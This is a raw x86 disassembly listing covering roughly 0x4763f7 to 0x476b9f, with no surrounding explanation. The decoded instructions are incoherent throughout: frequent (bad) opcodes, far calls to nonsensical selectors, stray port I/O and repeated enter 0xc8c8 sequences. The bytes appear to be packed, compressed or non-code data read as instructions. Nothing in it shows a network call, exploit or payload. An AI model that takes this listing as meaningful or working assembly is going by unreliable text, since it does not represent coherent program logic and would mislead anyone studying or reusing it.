  4763f7:	out    dx,al
  4763f8:	popf   
  4763f9:	test   al,0xa4
  4763fb:	aad    0xbe
  4763fd:	and    ch,bl
  4763ff:	test   BYTE PTR [esp+eiz*4],cl
  476402:	mov    al,ds:0xa906b639
  476407:	dec    esp
  476408:	enter  0x9ca0,0xb7
  47640c:	pushf  
  47640d:	cmp    esp,esi
  47640f:	sbb    BYTE PTR [edx],bh
  476411:	xor    DWORD PTR [eax],eax
  476413:	stos   DWORD PTR es:[edi],eax
  476414:	cwde   
  476415:	jno    0x4763d0
  476417:	dec    ebp
  476418:	rcl    DWORD PTR [ebx-0x7e971468],0x94
  47641f:	aaa    
  476420:	xchg   esp,eax
  476421:	je     0x47643f
  476423:	cmp    BYTE PTR [esi],al
  476425:	dec    esp
  476426:	mov    ds:0x909c3eeb,eax
  47642b:	(bad)  [esi+0x47908761]
  476431:	sub    BYTE PTR [edi+0x4e],cl
  476434:	inc    ebx
  476435:	(bad)  
  476437:	dec    eax
  476438:	fsubr  st(6),st
  47643a:	adc    al,0x52
  47643c:	mov    WORD PTR [edi],?
  47643e:	xchg   DWORD PTR [eax-0x6d],ecx
  476441:	mov    WORD PTR [ecx+0x64],ss
  476444:	cld    
  476445:	mov    WORD PTR [edx-0x2b87e9f9],?
  47644b:	and    DWORD PTR [eax+0x48a6f49d],ebp
  476451:	es sub al,0xa
  476454:	mov    BYTE PTR [ebp+0x11472c04],al
  47645a:	shl    BYTE PTR [ebx],cl
  47645c:	fnsave [edi+0x60d84484]
  476462:	pop    edi
  476463:	fist   WORD PTR [ebp-0x26a1bfe4]
  476469:	push   ss
  47646a:	std    
  47646b:	stc    
  47646c:	cld    
  47646d:	adc    ecx,esp
  47646f:	push   ebp
  476470:	jns    0x47647a
  476472:	add    BYTE PTR [esi-0x54],dl
  476475:	ror    DWORD PTR [esi],cl
  476477:	adc    DWORD PTR [esi],edx
  476479:	xlat   BYTE PTR ds:[ebx]
  47647a:	in     al,dx
  47647b:	push   ebx
  47647c:	mov    edi,0xe076fd00
  476481:	fwait
  476482:	inc    edx
  476483:	sbb    eax,0x3aeeec39
  476488:	test   dl,dh
  47648a:	sub    al,dl
  47648c:	dec    edx
  47648d:	mov    bh,0x7a
  47648f:	std    
  476490:	nop
  476491:	sbb    al,0xe4
  476493:	push   esp
  476494:	out    dx,al
  476495:	dec    esp
  476496:	cmp    ebp,0x7874222d
  47649c:	loopne 0x4764f1
  47649e:	xor    eax,0x22a6c1e0
  4764a3:	add    al,0xd9
  4764a5:	aad    0x40
  4764a7:	(bad)  
  4764a8:	frstor [ecx+edx*1-0x2e]
  4764ac:	jo     0x4764ee
  4764ae:	and    edi,esi
  4764b0:	jne    0x476489
  4764b2:	pushf  
  4764b3:	xor    al,0xd
  4764b5:	pop    ss
  4764b6:	push   eax
  4764b7:	push   edx
  4764b8:	loopne 0x4764a6
  4764ba:	loopne 0x4764c0
  4764bc:	push   edx
  4764bd:	cmp    DWORD PTR [edx+ebp*1+0x98be4fe],eax
  4764c4:	dec    ebx
  4764c5:	in     eax,0x47
  4764c7:	(bad)  
  4764c8:	loopne 0x476507
  4764ca:	mov    DWORD PTR [esp+eax*8+0x3d3f9084],0x1cbbde96
  4764d5:	leave  
  4764d6:	add    eax,DWORD PTR [ecx+0x2a]
  4764d9:	mov    DWORD PTR [edx+0x3ce906dd],esp
  4764df:	iret   
  4764e0:	sar    DWORD PTR [ecx+edx*1-0x1],cl
  4764e4:	sub    al,0x46
  4764e6:	addr16 mov dh,bl
  4764e9:	repz iret 
  4764eb:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4764ed:	ret    0x93
  4764f0:	inc    ecx
  4764f1:	add    BYTE PTR [edx+ebx*8+0x3cf78216],ch
  4764f8:	fbstp  TBYTE PTR [esi+0x1f]
  4764fb:	daa    
  4764fc:	cmc    
  4764fd:	adc    BYTE PTR [esi+eax*1],ch
  476500:	fwait
  476501:	popf   
  476502:	jo     0x4764a2
  476504:	inc    edi
  476505:	gs cmp eax,0x1cf3843a
  47650b:	js     0x4764bc
  47650d:	in     al,0x24
  47650f:	or     BYTE PTR [eax],al
  476511:	cmp    edx,eax
  476513:	dec    edi
  476514:	xor    eax,0x3d4d5b61
  476519:	xor    eax,0x84c46d3d
  47651e:	sub    eax,0x84413d33
  476523:	ins    DWORD PTR es:[edi],dx
  476524:	les    eax,FWORD PTR [ebp+edi*1+0x7b613541]
  47652b:	sar    BYTE PTR ds:0x3d39c03a,0xc1
  476532:	push   0x56396dc2
  476537:	aaa    
  476538:	pop    ebx
  476539:	pusha  
  47653a:	ins    DWORD PTR es:[edi],dx
  47653b:	call   0x6165:0xe423e470
  476542:	inc    edx
  476543:	push   cs
  476544:	stc    
  476545:	(bad)  
  476546:	loopne 0x476557
  476548:	mov    esi,0x984ddce0
  47654d:	fdiv   DWORD PTR ds:0xd837dc23
  476553:	and    ebx,DWORD PTR [ecx]
  476555:	es add al,0x36
  476558:	fdiv   DWORD PTR ds:0xc262d423
  47655e:	sub    bl,BYTE PTR [eax]
  476560:	aam    0xb9
  476562:	pop    ebp
  476563:	div    BYTE PTR [eax+eax*1+0x537f395b]
  47656a:	int    0x29
  47656c:	clc    
  47656d:	push   edx
  47656e:	(bad)
  476572:	ins    BYTE PTR es:[edi],dx
  476573:	int3   
  476574:	fild   DWORD PTR [edx-0x6edcfef7]
  47657a:	mov    al,0x66
  47657c:	mov    esi,0x20ed9309
  476581:	mov    ebp,DWORD PTR [edi-0x4d]
  476584:	sbb    eax,0x5239a07
  476589:	add    DWORD PTR [esi-0x1e],ecx
  47658c:	add    al,BYTE PTR [edi]
  47658e:	pop    ecx
  47658f:	sahf   
  476590:	out    0x79,eax
  476592:	call   0xf7d8:0xb5927601
  476599:	(bad)  
  47659a:	sahf   
  47659b:	outs   dx,BYTE PTR ds:[esi]
  47659c:	repnz ds push ss
  47659f:	pop    es
  4765a0:	daa    
  4765a1:	aam    0x1f
  4765a3:	jns    0x476543
  4765a5:	out    0xe9,eax
  4765a7:	pop    es
  4765a8:	inc    esp
  4765a9:	popa   
  4765aa:	jle    0x476547
  4765ac:	mov    eax,0x82690186
  4765b1:	and    al,ah
  4765b3:	les    edx,FWORD PTR [ebx+0x26135d81]
  4765b9:	shl    BYTE PTR [ebx],0xc0
  4765bc:	aaa    
  4765bd:	mov    cl,0x91
  4765bf:	or     DWORD PTR [ecx],0x23
  4765c2:	mov    esp,0x2da445bc
  4765c7:	cwde   
  4765c8:	jo     0x4765a7
  4765ca:	imul   eax,DWORD PTR [ebp-0x6a],0x630e63bc
  4765d1:	mov    ah,0xa3
  4765d3:	mov    ah,0x8b
  4765d5:	ins    BYTE PTR es:[edi],dx
  4765d6:	xchg   ecx,eax
  4765d7:	adc    edx,DWORD PTR [ebx]
  4765d9:	popa   
  4765da:	jl     0x476567
  4765dc:	cmp    eax,0x26c1c9c2
  4765e1:	and    esp,DWORD PTR [eax-0x6c]
  4765e4:	lods   al,BYTE PTR ds:[esi]
  4765e5:	test   BYTE PTR [ecx-0x53dc9f9d],cl
  4765eb:	popf   
  4765ec:	test   al,0x13
  4765ee:	adc    al,cl
  4765f0:	shl    BYTE PTR [ebx],0xa8
  4765f3:	aad    0x5d
  4765f5:	popf   
  4765f6:	mov    al,0xb6
  4765f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4765f9:	mov    dh,0x39
  4765fb:	pop    ebp
  4765fc:	mov    bh,0xd3
  4765fe:	test   BYTE PTR [ebp+0x20],ch
  476601:	cmp    DWORD PTR [ebx],esp
  476603:	pushf  
  476604:	(bad)  
  476605:	test   cl,cl
  476607:	sbb    eax,0x69239c71
  47660c:	ret    0x135b
  47660f:	pop    ebx
  476610:	aaa    
  476611:	and    esp,DWORD PTR [ecx+0x72]
  476614:	sbb    al,0xcf
  476616:	out    dx,al
  476617:	dec    esp
  476618:	xchg   esp,eax
  476619:	popf   
  47661a:	xchg   esp,eax
  47661b:	mov    cl,0xcb
  47661d:	xchg   ecx,eax
  47661e:	xor    esp,DWORD PTR [ebx]
  476620:	cmp    al,BYTE PTR [ebp+ebp*8-0x30ac6f7c]
  476627:	inc    edi
  476628:	or     cl,0x90
  47662b:	jmp    0x4765ca
  47662d:	add    eax,DWORD PTR [ecx-0x70]
  476630:	xor    ecx,esp
  476632:	and    eax,edx
  476634:	mov    edx,0xba98d502
  476639:	add    eax,0x7098da3d
  47663e:	leave  
  47663f:	lods   al,BYTE PTR ds:[esi]
  476640:	mov    eax,0x70c86609
  476645:	push   es
  476646:	fs inc eax
  476648:	shl    ah,1
  47664a:	sub    DWORD PTR [edi],eax
  47664c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47664d:	cwde   
  47664e:	jno    0x4765e0
  476650:	aaa    
  476651:	sub    edi,ebp
  476653:	retf   0x9672
  476656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  476657:	test   WORD PTR [edi],0xc32f
  47665c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47665d:	add    BYTE PTR [edx-0x39],cl
  476660:	mov    ds:0x8df21020,al
  476665:	mov    bh,0x83
  476667:	inc    eax
  476668:	ret    
  476669:	repnz inc ebp
  47666b:	xor    al,0x1a
  47666d:	mov    WORD PTR [ebp+0x5be3bdb],cx
  476674:	mov    WORD PTR [edi],0x89ae
  476679:	ja     0x476683
  47667b:	pop    edi
  47667c:	cs loop 0x4766cf
  47667f:	test   al,0x53
  476681:	or     eax,edi
  476683:	add    ebp,esp
  476685:	hlt    
  476686:	sub    dl,ah
  476688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  476689:	inc    ebp
  47668a:	xchg   esi,eax
  47668b:	gs push ebp
  47668d:	jmp    0x59eeff94
  476692:	stc    
  476693:	adc    BYTE PTR [esi],cl
  476695:	or     BYTE PTR [ebx+0x2e0b0657],bh
  47669b:	sbb    DWORD PTR [ecx],ebx
  47669d:	sub    bh,BYTE PTR [ebp+0x2a]
  4766a0:	data16 not bh
  4766a3:	pop    esi
  4766a4:	mov    al,ds:0x64af6654
  4766a9:	xchg   esi,eax
  4766aa:	fstp   QWORD PTR [eax+0x8]
  4766ad:	fwait
  4766ae:	sub    ebx,DWORD PTR [ecx+0x270600f6]
  4766b4:	pop    es
  4766b5:	inc    edx
  4766b6:	mov    ds:0x6f22e,eax
  4766bb:	fistp  QWORD PTR [eax-0x3a]
  4766be:	sub    eax,DWORD PTR [edi-0x1a5e6bce]
  4766c4:	stc    
  4766c5:	out    dx,al
  4766c6:	(bad)  
  4766c7:	sub    DWORD PTR [esi+0x57c7090e],edx
  4766cd:	sbb    al,0xa4
  4766cf:	add    bh,cl
  4766d1:	or     BYTE PTR [eax],al
  4766d3:	push   eax
  4766d4:	out    dx,eax
  4766d5:	pop    ebp
  4766d6:	and    cl,BYTE PTR [eax]
  4766d8:	pop    es
  4766d9:	add    dh,dl
  4766db:	aas    
  4766dc:	inc    eax
  4766dd:	cmc    
  4766de:	jno    0x476701
  4766e0:	loopne 0x4766ea
  4766e2:	jb     0x4766fe
  4766e4:	add    DWORD PTR [ecx+0x22],ecx
  4766e7:	pusha  
  4766e8:	test   DWORD PTR [ebp+0x3fe2892b],edi
  4766ee:	aam    0x5f
  4766f0:	add    DWORD PTR [ebp+0x6d45df3f],esp
  4766f6:	jo     0x47676c
  4766f8:	jns    0x4766e8
  4766fa:	pop    ecx
  4766fb:	cmp    ch,bl
  4766fd:	lahf   
  4766fe:	dec    esi
  4766ff:	jne    0x476740
  476701:	pop    ds
  476702:	outs   dx,BYTE PTR ds:[esi]
  476703:	or     ah,dh
  476705:	data16 (bad) 
  476707:	and    BYTE PTR [ebx+0x6d],dl
  47670a:	popa   
  47670b:	mov    cl,BYTE PTR [ecx]
  47670d:	and    BYTE PTR [ebp-0x1cf8d89f],bl
  476713:	aas    
  476714:	mul    BYTE PTR [esi+0x3e06477c]
  47671a:	ins    BYTE PTR es:[di],dx
  47671c:	add    BYTE PTR gs:[edi],bl
  47671f:	inc    esp
  476720:	outs   dx,DWORD PTR ds:[esi]
  476721:	jne    0x476785
  476723:	add    ch,bl
  476725:	jmp    DWORD PTR [esi]
  476727:	xchg   DWORD PTR [ebx+0x75],eax
  47672a:	jb     0x47679e
  47672c:	outs   dx,BYTE PTR gs:[esi]
  47672e:	arpl   WORD PTR [edi+0x11],bp
  476731:	fs sub al,0x4
  476734:	and    DWORD PTR [edi+0x4d82c6c6],edi
  47673a:	dec    edi
  47673b:	pusha  
  47673c:	xchg   BYTE PTR [edi+0xa],ah
  47673f:	and    eax,0x3f25102c
  476744:	imul   eax,DWORD PTR ds:0xf3dc206,0x14b1840
  47674e:	imul   ebx,DWORD PTR [edi],0x3e
  476751:	leave  
  476752:	aas    
  476753:	xchg   esi,eax
  476754:	fwait
  476755:	aas    
  476756:	push   ebp
  476757:	outs   dx,BYTE PTR ds:[esi]
  476758:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  47675c:	inc    esp
  47675d:	arpl   WORD PTR gs:[ecx-0x3f],bp
  476761:	inc    ebx
  476762:	add    al,0xd
  476764:	pushf  
  476765:	mov    bh,0x24
  476767:	xor    BYTE PTR [esi-0x31],al
  47676a:	add    eax,ecx
  47676c:	mov    al,ds:0x74b4684d
  476771:	mov    al,0x47
  476773:	inc    edx
  476774:	sub    al,0x20
  476776:	ins    DWORD PTR es:[edi],dx
  476777:	xchg   ebx,eax
  476778:	jns    0x476799
  47677a:	jp     0x4767e8
  47677c:	and    dh,BYTE PTR gs:[eax]
  47677f:	aaa    
  476780:	nop
  476781:	daa    
  476782:	dec    ebp
  476783:	mov    eax,0x37050c33
  476788:	ss xor al,0xf7
  47678b:	pop    ebx
  47678c:	adc    DWORD PTR [eax+0x2e],ebx
  47678f:	push   esi
  476790:	clc    
  476791:	push   eax
  476792:	adc    eax,0x84af0bbf
  476797:	in     eax,0x7e
  476799:	pop    es
  47679a:	adc    eax,0x8166fb8b
  47679f:	je     0x4767ca
  4767a1:	ds jmp 0x47678b
  4767a4:	dec    DWORD PTR [edi]
  4767a6:	es ja  0x4767bf
  4767a9:	test   BYTE PTR [eax],dl
  4767ab:	xlat   BYTE PTR ds:[ebx]
  4767ac:	dec    esi
  4767ad:	xchg   ecx,eax
  4767ae:	mov    edx,0x5d40ce24
  4767b3:	idiv   DWORD PTR [ebx]
  4767b5:	pop    ebx
  4767b6:	and    al,0x99
  4767b8:	aad    0x40
  4767ba:	sti    
  4767bb:	ss in  al,0xba
  4767be:	xchg   esp,eax
  4767bf:	ins    BYTE PTR es:[edi],dx
  4767c0:	and    BYTE PTR [edi+0x73],cl
  4767c3:	mov    al,0x2f
  4767c5:	add    DWORD PTR [esi],ecx
  4767c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4767c8:	lock mov cl,0x2e
  4767cb:	cmc    
  4767cc:	jmp    0x47683f
  4767ce:	lea    ebx,[ecx-0xb]
  4767d1:	cmp    ecx,DWORD PTR [ebp+0x10b2edca]
  4767d7:	popf   
  4767d8:	jl     0x47676f
  4767da:	cld    
  4767db:	stc    
  4767dc:	loope  0x4767f0
  4767de:	pop    eax
  4767df:	pop    es
  4767e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4767e1:	jecxz  0x476802
  4767e3:	pop    edi
  4767e4:	ja     0x476795
  4767e6:	retf   0x3375
  4767e9:	sbb    esp,eax
  4767eb:	dec    eax
  4767ec:	push   esi
  4767ed:	cmp    eax,0xcd070042
  4767f2:	or     BYTE PTR ss:[ebp+0x1302ac61],cl
  4767f9:	cmp    al,0x54
  4767fb:	sub    DWORD PTR [ebx-0x1c],esi
  4767fe:	mov    eax,DWORD PTR [edi-0x307b6aeb]
  476804:	jp     0x47683d
  476806:	adc    dl,BYTE PTR [ebx-0x50]
  476809:	test   bh,0x20
  47680c:	add    al,0x9c
  47680e:	jl     0x47685b
  476810:	add    ecx,DWORD PTR [ebx]
  476812:	mov    al,0x25
  476814:	inc    eax
  476815:	shl    BYTE PTR [esi+0x23],0x96
  476819:	cmp    cl,0x22
  47681c:	cld    
  47681d:	fs in  al,0xc8
  476820:	jb     0x4767b1
  476822:	out    dx,al
  476823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  476824:	in     eax,dx
  476825:	call   0x6e0fa32
  47682a:	repz or DWORD PTR [ecx+0x3e],eax
  47682e:	inc    edx
  47682f:	pop    es
  476830:	inc    ecx
  476831:	outs   dx,BYTE PTR ds:[esi]
  476832:	jns    0x476811
  476834:	xchg   edi,eax
  476835:	sub    DWORD PTR [edx-0x7b],edi
  476838:	and    BYTE PTR [edi+0x6],al
  47683b:	push   edx
  47683c:	gs pushw ds
  47683f:	push   es
  476840:	push   edx
  476841:	or     DWORD PTR [edi+edx*2],edi
  476844:	xor    eax,0xd56079f
  476849:	push   esi
  47684a:	jae    0x4768a7
  47684c:	jle    0x476850
  47684e:	xor    bh,0xc4
  476851:	sub    al,0xa6
  476853:	jo     0x4768a2
  476855:	sahf   
  476856:	lock cli 
  476858:	xor    BYTE PTR es:[edx],dh
  47685b:	test   al,0x85
  47685d:	xchg   edx,esp
  47685f:	imul   ebp,DWORD PTR [eax],0xb77540e4
  476865:	sbb    BYTE PTR [edi-0x41a9e02a],bh
  47686b:	and    BYTE PTR [esi+0x68],bh
  47686e:	and    al,0x8
  476870:	jl     0x476896
  476872:	cmp    eax,0x7e88961b
  476877:	jno    0x476881
  476879:	inc    ecx
  47687a:	(bad)  
  47687b:	fisttp DWORD PTR [ebx]
  47687d:	mov    al,BYTE PTR ds:0x4bd87041
  476883:	and    edx,0x5d
  476886:	es test al,0x32
  476889:	jl     0x47682b
  47688b:	hlt    
  47688c:	cwde   
  47688d:	cmp    eax,DWORD PTR ds:0xc6df8228
  476893:	shr    BYTE PTR [eax+0x5b],0x26
  476897:	xor    BYTE PTR [esi],ch
  476899:	push   DWORD PTR [ebp-0x18]
  47689c:	out    0xb8,eax
  47689e:	loopne 0x476850
  4768a0:	cmp    edi,DWORD PTR [eax+0x72]
  4768a3:	xchg   edi,eax
  4768a4:	push   ebp
  4768a5:	shl    ch,1
  4768a7:	out    dx,al
  4768a8:	xchg   esp,eax
  4768a9:	pop    edx
  4768aa:	fmul   QWORD PTR [ecx]
  4768ac:	sbb    dh,dl
  4768ae:	push   edi
  4768af:	cmp    BYTE PTR [ecx],ah
  4768b1:	test   BYTE PTR [ebx],al
  4768b3:	lock pop esp
  4768b5:	pop    esi
  4768b6:	or     DWORD PTR [ecx],0x8bfbc5e8
  4768bc:	aam    0x66
  4768be:	lds    eax,FWORD PTR [edi+0x149eb14]
  4768c4:	jo     0x476930
  4768c6:	push   eax
  4768c7:	adc    bh,0x1c
  4768ca:	jmp    0x4768e7
  4768cc:	sub    BYTE PTR ds:0x30fa159c,ah
  4768d2:	push   edi
  4768d3:	push   edi
  4768d4:	js     0x47685f
  4768d6:	out    dx,eax
  4768d7:	cli    
  4768d8:	or     al,0x6d
  4768da:	jge    0x476916
  4768dc:	cmp    edi,DWORD PTR [ebx+0x4]
  4768df:	je     0x476900
  4768e1:	mov    DWORD PTR cs:[ebx+0x4d],edi
  4768e5:	pop    eax
  4768e6:	(bad)  
  4768e7:	adc    BYTE PTR [edi-0x7a],dl
  4768ea:	or     bh,al
  4768ec:	or     BYTE PTR [ebp+0x4d87c481],dl
  4768f2:	mov    esp,0x172b72d3
  4768f7:	pop    ss
  4768f8:	mov    ds:0x11a0458d,eax
  4768fd:	fnsave [ebx+0x7e]
  476900:	test   dh,0x6b
  476903:	cmp    BYTE PTR [eax],dh
  476905:	inc    ebp
  476906:	mov    ebx,0xa82bfc1f
  47690b:	lea    edx,[edx+edx*2]
  47690e:	add    edx,0x448ae094
  476914:	add    dl,dh
  476916:	add    BYTE PTR [ecx-0x2d727d20],0xff
  47691d:	mov    esp,ecx
  47691f:	mov    dl,0x39
  476921:	clc    
  476922:	or     ebx,DWORD PTR [esi]
  476924:	mov    ebp,DWORD PTR [eax]
  476926:	call   DWORD PTR [ebp+0xc]
  476929:	mov    dl,BYTE PTR [edx]
  47692b:	add    al,0x24
  47692d:	retf   0x45c4
  476930:	xor    bl,al
  476932:	xchg   DWORD PTR [ebp+0x12],ebx
  476935:	pop    ds
  476936:	inc    edx
  476937:	or     DWORD PTR [edi+0x1bfb5585],0x2e506272
  476941:	std    
  476942:	jmp    0x47694d
  476944:	xor    al,0x80
  476946:	xor    BYTE PTR ds:0xe2d8df08,0x53
  47694d:	sar    BYTE PTR [eax+esi*4+0xd8b5715],0x44
  476955:	ror    BYTE PTR [ebx],0x70
  476958:	(bad)  
  476959:	in     al,dx
  47695a:	sub    bl,cl
  47695c:	add    dl,dh
  47695e:	sbb    bl,dh
  476960:	repnz or DWORD PTR [edx-0x137bc744],ecx
  476967:	add    al,0x58
  476969:	mov    ecx,cs
  47696b:	adc    DWORD PTR [edi+0x7e7eddb3],eax
  476971:	or     BYTE PTR [ebx],bl
  476973:	sub    DWORD PTR [eax+0x469aef16],esp
  476979:	add    dh,BYTE PTR [edi+0x2f]
  47697c:	sar    DWORD PTR [ecx+eiz*1],cl
  47697f:	mov    eax,0xffe898d
  476984:	inc    ecx
  476985:	inc    esp
  476986:	test   eax,0xec01ac3a
  47698b:	sbb    cl,ah
  47698d:	add    BYTE PTR [eax],bh
  47698f:	ud1    ecx,DWORD PTR [esi-0x25]
  476993:	psadbw mm2,QWORD PTR [eax]
  476996:	pusha  
  476997:	out    0xdd,eax
  476999:	fsub   DWORD PTR [edi-0x57]
  47699c:	aaa    
  47699d:	cmc    
  47699e:	dec    edx
  47699f:	add    ebx,DWORD PTR [ebp+0x15]
  4769a2:	inc    eax
  4769a3:	jg     0x47696d
  4769a5:	push   DWORD PTR [edx]
  4769a7:	mov    cl,0xd8
  4769a9:	xor    eax,0x5d1a1797
  4769ae:	sub    al,0x60
  4769b0:	pop    edi
  4769b1:	aas    
  4769b2:	loopne 0x4769b1
  4769b4:	cmc    
  4769b5:	adc    al,0x19
  4769b7:	ror    BYTE PTR [eax+0x7724d0e],1
  4769bd:	xchg   esp,eax
  4769be:	add    DWORD PTR [edx],ebp
  4769c0:	ror    BYTE PTR [esp+edx*8],0x76
  4769c4:	imul   esp,DWORD PTR [ecx-0x3f5ef3f7],0xb97e38a0
  4769ce:	inc    ecx
  4769cf:	jle    0x47697e
  4769d1:	xchg   edi,eax
  4769d2:	cld    
  4769d3:	pop    esp
  4769d4:	or     esp,DWORD PTR [ecx+0x34509e79]
  4769da:	sbb    al,0x9b
  4769dc:	xchg   edx,eax
  4769dd:	sti    
  4769de:	cmp    BYTE PTR [eax-0x212203c7],bh
  4769e4:	xchg   esi,eax
  4769e5:	cmp    eax,edx
  4769e7:	setg   BYTE PTR [ecx+0x26]
  4769eb:	inc    ecx
  4769ec:	mov    eax,DWORD PTR [eax+edi*4-0xe7ddb53]
  4769f3:	or     BYTE PTR [ebp+0x46],cl
  4769f6:	in     al,0x31
  4769f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4769f9:	dec    ebp
  4769fa:	fnstenv [ebp-0x37]
  4769fd:	loope  0x476a62
  4769ff:	or     eax,eax
  476a01:	push   cs
  476a02:	or     al,BYTE PTR [ebx]
  476a04:	cmp    ebp,DWORD PTR [edi]
  476a06:	add    ecx,DWORD PTR [edi+0x76]
  476a09:	daa    
  476a0a:	lock dec BYTE PTR [ebp-0x10]
  476a0e:	jmp    0x476a22
  476a10:	adc    BYTE PTR [ebx+eax*4+0x27],ah
  476a14:	inc    edx
  476a15:	or     al,0x8e
  476a17:	in     al,0x44
  476a19:	xor    ah,al
  476a1b:	pop    edi
  476a1c:	and    eax,0x8271780c
  476a21:	inc    DWORD PTR [edx+0x46507c3c]
  476a27:	xor    edi,edi
  476a29:	inc    ebx
  476a2a:	sbb    al,0xb8
  476a2c:	add    DWORD PTR [esi-0x3],ebx
  476a2f:	mov    WORD PTR es:[ebx],?
  476a32:	sbb    eax,0xc696350b
  476a37:	pop    ebx
  476a38:	imul   edi,DWORD PTR [ecx],0x3819bfc9
  476a3e:	mov    BYTE PTR [eax-0x4],bl
  476a41:	jmp    0x476a79
  476a43:	shr    BYTE PTR [eax+0x5c],1
  476a46:	addr16 jmp 0x1889:0x471b27c
  476a4e:	loop   0x476a6e
  476a50:	rcr    DWORD PTR [ebx],0x20
  476a53:	pop    esp
  476a54:	inc    edi
  476a55:	dec    esi
  476a56:	jne    0x476a0b
  476a58:	xchg   ecx,eax
  476a59:	sub    al,0xc
  476a5b:	aam    0x39
  476a5d:	push   ss
  476a5e:	inc    eax
  476a5f:	cmp    eax,0x58081149
  476a64:	pushf  
  476a65:	popf   
  476a66:	ins    DWORD PTR es:[edi],dx
  476a67:	cmp    ecx,DWORD PTR [edx+0x63]
  476a6a:	mov    esp,edi
  476a6c:	fisubr WORD PTR [edi+ecx*2]
  476a6f:	retf   
  476a70:	pop    edx
  476a71:	or     al,0xbc
  476a73:	sbb    ecx,DWORD PTR [ecx+0x75a61cbf]
  476a79:	(bad)  
  476a7a:	shl    DWORD PTR [ebx],0xf8
  476a7d:	es clc 
  476a7f:	or     al,0xc9
  476a81:	cmp    BYTE PTR [eax-0x6e39627a],0x8b
  476a88:	mov    ch,ah
  476a8a:	pop    es
  476a8b:	inc    ecx
  476a8c:	inc    eax
  476a8d:	arpl   dx,sp
  476a8f:	adc    eax,0x21285c69
  476a94:	dec    ebp
  476a95:	pushf  
  476a96:	and    ebx,DWORD PTR [eax-0x7]
  476a99:	push   esi
  476a9a:	cld    
  476a9b:	xchg   eax,esp
  476a9d:	fsub   DWORD PTR [ecx]
  476a9f:	shl    bh,cl
  476aa1:	xor    al,0x46
  476aa3:	dec    ecx
  476aa4:	push   ebx
  476aa5:	aas    
  476aa6:	jne    0x476ab5
  476aa8:	jle    0x476a82
  476aaa:	jae    0x476a3c
  476aac:	inc    ecx
  476aad:	sbb    al,0x88
  476aaf:	jns    0x476b26
  476ab1:	neg    esp
  476ab3:	mov    eax,0xbcfdeddc
  476ab8:	pop    edi
  476ab9:	mov    cl,0xea
  476abb:	or     al,0x2c
  476abd:	mov    eax,0x1012ea04
  476ac2:	mov    edx,0xda56e914
  476ac7:	dec    edx
  476ac8:	bound  esp,QWORD PTR [edx-0x23e7cd88]
  476ace:	lock stc 
  476ad0:	scas   al,BYTE PTR es:[edi]
  476ad1:	cmp    al,0xa6
  476ad3:	inc    eax
  476ad4:	int3   
  476ad5:	jno    0x476aab
  476ad7:	add    al,0x41
  476ad9:	sbb    ah,dh
  476adb:	outs   dx,DWORD PTR ds:[esi]
  476adc:	pop    ecx
  476add:	jns    0x476ad8
  476adf:	jl     0x476ae5
  476ae1:	hlt    
  476ae2:	inc    eax
  476ae3:	cmp    BYTE PTR [edx+0x30],dh
  476ae6:	not    DWORD PTR [ebx+esi*2+0x70]
  476aea:	or     al,0x6f
  476aec:	jns    0x476b3e
  476aee:	(bad)  
  476aef:	xor    eax,DWORD PTR [ebp-0x6d3c7738]
  476af5:	inc    edi
  476af6:	push   ebx
  476af7:	jl     0x476b06
  476af9:	inc    esi
  476afa:	enter  0xc8c8,0x35
  476afe:	push   es
  476aff:	xchg   ecx,eax
  476b00:	xchg   edx,eax
  476b01:	xchg   ebx,eax
  476b02:	enter  0xc8c8,0xc8
  476b06:	xchg   esp,eax
  476b07:	xchg   ebp,eax
  476b08:	xchg   esi,eax
  476b09:	xchg   edi,eax
  476b0a:	enter  0xc8c8,0xc8
  476b0e:	cwde   
  476b0f:	cdq    
  476b10:	call   0x9cc8:0xc8c8c89b
  476b17:	popf   
  476b18:	sahf   
  476b19:	lahf   
  476b1a:	enter  0xc8c8,0xc8
  476b1e:	add    BYTE PTR [ecx-0x37377c7e],0xc8
  476b25:	enter  0x8584,0x86
  476b29:	xchg   eax,ecx
  476b2b:	enter  0xc8c8,0x88
  476b2f:	mov    DWORD PTR [edx-0x37373775],ecx
  476b35:	enter  0x8d8c,0x8e
  476b39:	pop    DWORD PTR [ebx+0x70c8c87c]
  476b3f:	jno    0x476aee
  476b41:	push   cs
  476b42:	inc    ecx
  476b43:	cmp    al,0xce
  476b45:	or     DWORD PTR [ecx-0x6e],edi
  476b48:	mov    BYTE PTR [esi+ecx*1+0x52883c41],dh
  476b4f:	pop    eax
  476b50:	xchg   esp,eax
  476b51:	adc    al,0x77
  476b53:	and    DWORD PTR [edi+0x1b75575],esi
  476b59:	(bad)  
  476b5a:	jb     0x476ba4
  476b5c:	pop    edi
  476b5d:	add    eax,0x8d0150b6
  476b62:	inc    esp
  476b63:	adc    BYTE PTR [edi+0x4f],ah
  476b66:	xor    cl,BYTE PTR [eax+edx*1]
  476b69:	push   ds
  476b6a:	adc    BYTE PTR [eax-0x44],cl
  476b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  476b6e:	and    cl,BYTE PTR [eax+0x14]
  476b71:	or     BYTE PTR [edx],dl
  476b73:	add    BYTE PTR [eax],dl
  476b75:	lea    esp,[ecx]
  476b77:	test   BYTE PTR [ebx+0x7c8b122c],cl
  476b7d:	or     dh,dh
  476b7f:	(bad)  
  476b80:	jmp    DWORD PTR [ecx+0x61]
  476b83:	mov    cl,BYTE PTR [esi]
  476b85:	add    dl,BYTE PTR [ebx]
  476b87:	mov    bl,BYTE PTR [ecx+edx*1-0x1]
  476b8b:	xor    bl,BYTE PTR [ecx+esi*1]
  476b8e:	test   bl,0xdf
  476b91:	jne    0x476b98
  476b93:	(bad)  
  476b95:	or     al,BYTE PTR [eax-0x3e]
  476b98:	jmp    0x476ba8
  476b9a:	cs inc eax
  476b9c:	dec    eax
  476b9d:	xor    DWORD PTR [ecx],eax
  476b9f:	cmp    eax,edi
